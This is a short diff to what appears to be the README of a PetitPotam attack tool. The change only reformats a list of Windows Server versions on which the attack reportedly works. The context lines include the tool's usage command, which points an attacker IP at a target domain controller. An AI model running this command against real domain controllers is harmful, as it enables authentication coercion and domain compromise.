@@ -45,10 +45,10 @@ python3 Petitpotam.py -d '' -u '' -p '' [ATTACKER-IP] [TARGET-DC-IP]
 
 ### Checked against the following versions
 
-* Windows Server 2008(R2) - works, no credentials needed
-* Windows Server 2012(R2) - works, low privilege credentials needed
-* Windows Server 2016 - works, no credentials needed
-* Windows Server 2019 - works, no credentials needed
+- Windows Server 2008(R2) - works, no credentials needed
+- Windows Server 2012(R2) - works, low privilege credentials needed
+- Windows Server 2016 - works, no credentials needed
+- Windows Server 2019 - works, no credentials needed
 
 ### Low privilege AD user on Server 2016
 
